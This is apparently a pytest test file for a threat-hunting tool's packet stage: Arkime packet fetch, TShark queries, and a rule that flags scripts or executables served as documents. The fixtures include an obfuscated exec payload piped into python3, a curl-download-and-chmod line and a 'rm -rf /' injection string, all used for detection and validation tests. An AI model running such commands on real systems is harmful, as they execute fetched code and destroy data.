"""Packet slice: Arkime packet fetch, constrained TShark, body analysis, the disguised-script rule, the stage."""
import subprocess
from datetime import UTC, datetime, timedelta

import httpx
import pytest

from romulus.config import Settings
from romulus.detect.packets import DisguisedScriptOrExecutable, analyze_body, declared_document
from romulus.detect.registry import fresh_pack
from romulus.evidence.typed import RawRef, TypedEvent, fv
from romulus.sources import packets as pk
from romulus.sources.models import Completeness, SearchOutcome, Window
from romulus.sources.profile import contract_from_types
from romulus.store.db import make_engine, migrate
from romulus.store.repo import Repo

PCAP = b"\xd4\xc3\xb2\xa1" + b"\x00" * 60
SCRIPT = b"echo exec\\(__import__\\('zlib'\\).decompress\\(...\\)\\) | python3\n"
T0 = datetime(2024, 11, 18, 15, 0, 1, tzinfo=UTC)


# ---- body analysis -----------------------------------------------------------------------------

@pytest.mark.parametrize("body, kind", [
    (b"\x7fELF\x02\x01\x01" + b"\x00" * 20, "executable"),
    (b"MZ" + b"\x00" * 60 + b"PE\x00\x00", "executable"),
    (b"MZ is not a header here", "text"),
    (b"#!/usr/bin/env python3\nprint(1)\n", "script"),
    (SCRIPT, "script"),
    (b"# Project notes\n\nInstall the package, then run the tests.\n", "text"),
    (b"\xff\xfe\x00binary", "binary"),
    (b"", "empty"),
])
def test_body_kind_is_judged_from_the_bytes(body, kind):
    assert analyze_body(body).kind == kind


def test_shebang_interpreter_and_pipes_are_reported():
    assert analyze_body(b"#!/usr/bin/env python3\nx=1\n").interpreter == "python3"
    info = analyze_body(SCRIPT)
    assert info.commands == ["echo"] and info.piped_to == ["python3"]


@pytest.mark.parametrize("path, ctype, expect", [
    ("http://192.0.2.174/TODO.md", "text/markdown", True),
    ("http://192.0.2.174/README.txt.1", "text/plain", True),
    ("http://host/install.sh", "text/x-sh", False),
    ("http://host/a", "image/png", True),
])
def test_served_as_a_document_uses_extension_and_declared_type(path, ctype, expect):
    assert bool(declared_document(path, ctype)) is expect


# ---- the rule ----------------------------------------------------------------------------------

def body_event(_id, body, *, url="http://192.0.2.174/TODO.md", ctype="text/markdown", client="172.17.100.121",
               ts=T0):
    info = analyze_body(body)
    fields = {"source.ip": "192.0.2.174", "destination.ip": client, "url.original": url,
              "http.response.status_code": 200, "http.content_type": ctype, "file.size": len(body),
              "file.sha256": __import__("hashlib").sha256(body).hexdigest(), "http.body.kind": info.kind,
              "http.body.detail": info.detail or None, "http.body.piped_to": info.piped_to or None,
              "arkime.session_id": f"241118-{_id}"}
    return TypedEvent(id=_id, family="http_body", ts=ts, host="server",
                      fields={k: fv(v, f"fixture:{k}") for k, v in fields.items() if v is not None},
                      raw=[RawRef(target="arkime-pcap:x", native_id=_id)], normalizer="fixture")


def rule(*events):
    r = DisguisedScriptOrExecutable()
    r.consume(list(events))
    return r.finalize()


def test_repeated_disguised_script_is_one_item_with_exact_counts_and_high_lane_when_piped():
    m = rule(*[body_event(f"s{i}", SCRIPT, ts=T0 + timedelta(minutes=15 * i)) for i in range(10)])
    assert len(m) == 1 and m[0].proposed_lane == "high"
    assert m[0].claim.startswith("Packets of 10 Arkime session(s)")
    assert "served as a document (file name 'todo.md' (extension .md); declared Content-Type text/markdown)" in m[0].claim
    assert "pipes into python3" in m[0].claim and "not established" in m[0].claim


def test_unpiped_script_is_a_lead_and_executables_are_high():
    assert rule(body_event("a", b"curl http://e/x -o /tmp/y\nchmod +x /tmp/y\n"))[0].proposed_lane == "lead"
    elf = body_event("b", b"\x7fELF\x02" + b"\x00" * 30, url="http://host/logo.png", ctype="image/png")
    assert rule(elf)[0].proposed_lane == "high"


@pytest.mark.parametrize("ev", [
    body_event("t", b"# Notes\n\nPlain prose here.\n"),                              # a real document
    body_event("u", SCRIPT, url="http://host/install.sh", ctype="text/x-sh"),         # a script served as one
])
def test_documents_and_honestly_named_scripts_do_not_match(ev):
    assert rule(ev) == []


def test_packet_rules_never_run_in_the_sweep():
    assert not [p for p in fresh_pack() if p.kind == "packet"]


# ---- Arkime packet fetch -----------------------------------------------------------------------

def _settings(tmp_path, **kw):
    return Settings(home=tmp_path, arkime_url="http://arkime.test", arkime_username="u", arkime_password="p", **kw)


def _fetcher(tmp_path, handler, **kw):
    return pk.ArkimePackets(_settings(tmp_path), transport=httpx.MockTransport(handler), **kw)


def test_fetch_is_a_get_for_explicit_ids_only(tmp_path):
    seen = []

    def handler(request):
        seen.append(request)
        return httpx.Response(200, content=PCAP)

    out = _fetcher(tmp_path, handler).fetch(["241118-AAAAAAAAAAAA", "241118-BBBBBBBBBBBB"], tmp_path / "a.pcap")
    assert out.error is None and out.path.read_bytes() == PCAP
    assert all(r.method == "GET" and r.url.path == "/api/sessions/pcap" for r in seen)
    assert seen[-1].url.params["ids"] == "241118-AAAAAAAAAAAA,241118-BBBBBBBBBBBB"


@pytest.mark.parametrize("status, body, error", [
    (403, b'{"success":false}', "refused packet download"),
    (200, b"<html>login</html>", "not a capture file"),
    (500, b"", "HTTP 500"),
])
def test_fetch_failures_are_reported_not_raised(tmp_path, status, body, error):
    out = _fetcher(tmp_path, lambda r: httpx.Response(status, content=body)).fetch(["241118-AAAAAAAAAAAA"],
                                                                                 tmp_path / "a.pcap")
    assert out.path is None and error in out.error


def test_fetch_caps_bytes(tmp_path):
    out = _fetcher(tmp_path, lambda r: httpx.Response(200, content=PCAP + b"x" * 5000), max_bytes=100).fetch(
        ["241118-AAAAAAAAAAAA"], tmp_path / "a.pcap")
    assert out.capped and out.path.stat().st_size == 100


@pytest.mark.parametrize("ids", [["bad id; rm -rf /"], [], [f"241118-{i:012d}" for i in range(21)]])
def test_fetch_refuses_invalid_or_too_many_ids(tmp_path, ids):
    with pytest.raises(pk.PacketError):
        _fetcher(tmp_path, lambda r: httpx.Response(200, content=PCAP)).fetch(ids, tmp_path / "a.pcap")


# ---- TShark --------------------------------------------------------------------------------------

def test_tshark_runs_the_fixed_query_without_packet_count_limits(tmp_path, monkeypatch):
    cap = tmp_path / "a.pcap"
    cap.write_bytes(PCAP)
    calls = []
    fields = pk.QUERIES["http_responses"][1]
    line = "\t".join("9" if f in ("frame.number", "tcp.srcport", "tcp.dstport", "http.response.code") else "x"
                     for f in fields)

    def fake_run(cmd, **kw):
        calls.append(cmd)
        return subprocess.CompletedProcess(cmd, 2, stdout=line + "\n",
                                           stderr="The file appears to have been cut short in the middle of a packet.")

    monkeypatch.setattr(pk.subprocess, "run", fake_run)
    res = pk.run_tshark(Settings(home=tmp_path), cap, "http_responses", [tmp_path])
    cmd = calls[0]
    assert "-c" not in cmd and cmd[cmd.index("-Y") + 1] == "http.response" and "-r" in cmd
    assert res.truncated and res.error is None and res.rows[0]["frame.number"] == "9"


def test_tshark_refuses_paths_outside_allowed_dirs(tmp_path):
    other = tmp_path / "elsewhere"
    other.mkdir()
    cap = other / "a.pcap"
    cap.write_bytes(PCAP)
    with pytest.raises(pk.PacketError):
        pk.run_tshark(Settings(home=tmp_path), cap, "http_responses", [tmp_path / "allowed"])


def test_hex_body_decoding_caps_and_rejects_non_hex():
    body, cut = pk.decode_hex_body("41424344", 2)
    assert body == b"AB" and cut
    with pytest.raises(pk.PacketError):
        pk.decode_hex_body("zz", 10)


# ---- the stage, end to end with stubbed Arkime and TShark ---------------------------------------

class _Packets:
    def __init__(self, error=None):
        self.error = error

    def fetch(self, ids, dest):
        if self.error:
            return pk.PacketFetch(None, ids, error=self.error)
        dest.write_bytes(PCAP)
        return pk.PacketFetch(dest, ids, len(PCAP))


def _session(_id, cport):
    return {"_id": _id, "_index": "arkime_sessions3-241118", "_source": {
        "node": "server", "network": {"community_id": f"1:{_id}="},
        "source": {"ip": "172.17.100.121", "port": cport}, "destination": {"ip": "192.0.2.174", "port": 80}}}


def _row(cport, epoch):
    return {"frame.number": "7", "frame.time_epoch": str(epoch), "tcp.stream": "0", "ip.src": "192.0.2.174",
            "tcp.srcport": "80", "ip.dst": "172.17.100.121", "tcp.dstport": str(cport), "ipv6.src": None,
            "ipv6.dst": None, "http.response.code": "200", "http.content_type": "text/markdown",
            "http.content_length": str(len(SCRIPT)), "http.response_for.uri": "http://192.0.2.174/TODO.md",
            "http.file_data": SCRIPT.hex()}


def _stage(tmp_path, monkeypatch, packets):
    from romulus.hunt import packets as hp
    sessions = [_session(f"241118-SESS{i:08d}", 50000 + i) for i in range(3)]
    monkeypatch.setattr(hp, "execute", lambda client, intent, contract: SearchOutcome(
        target=intent.target, fingerprint="f", started_at=T0, ended_at=T0, completeness=Completeness.complete,
        total=len(sessions), total_relation="eq", returned=len(sessions), records=sessions))
    monkeypatch.setattr(hp, "run_tshark", lambda s, pcap, query, dirs: pk.TsharkResult(
        rows=[_row(50000 + i, T0.timestamp() + 900 * i) for i in range(3)]))
    engine = make_engine(":memory:")
    migrate(engine)
    repo = Repo(engine)
    repo.create_hunt("h1", {}, "d", "t")
    contract = contract_from_types("arkime_sessions3-241118", {"firstPacket": "date", "lastPacket": "date",
                                                               "network.community_id": "keyword",
                                                               "protocol": "keyword", "http.bodyMagic": "keyword"})
    window = Window(start=T0 - timedelta(hours=1), end=T0 + timedelta(hours=2))
    summary = hp.run_packet_stage(Settings(home=tmp_path), repo, None, "h1", window,
                                  {"arkime_sessions3-241118": contract}, packets=packets)
    return repo, summary


def test_stage_publishes_a_cited_finding_and_a_positive_only_cell(tmp_path, monkeypatch):
    from romulus.report import manifest as rm
    repo, summary = _stage(tmp_path, monkeypatch, _Packets())
    assert summary["status"] == "complete" and summary["candidates"] == 3 and summary["responses"] == 3
    found = [c for c in repo.candidates("h1") if c["rule_id"] == "pcap.disguised_script_or_executable"]
    assert len(found) == 1 and found[0]["lane"] == "high"
    cites = rm._citations(repo, found[0])
    assert len(cites) == 3 and all(c["status"] == "retained" for c in cites)
    cell = next(c for c in repo.rule_cells("h1") if c["rule_id"] == "pcap.disguised_script_or_executable")
    assert cell["state"] == "matched"
    assert not list((tmp_path / "stage").glob("romulus-pcap-*"))          # packets are removed after use


def test_stage_records_refused_downloads_as_partial_never_complete(tmp_path, monkeypatch):
    repo, summary = _stage(tmp_path, monkeypatch, _Packets(error="Arkime refused packet download (403)"))
    assert summary["status"] == "partial" and summary["failed_batches"] == 1
    cell = next(c for c in repo.rule_cells("h1") if c["rule_id"] == "pcap.disguised_script_or_executable")
    assert cell["state"] == "positive_only_partial"
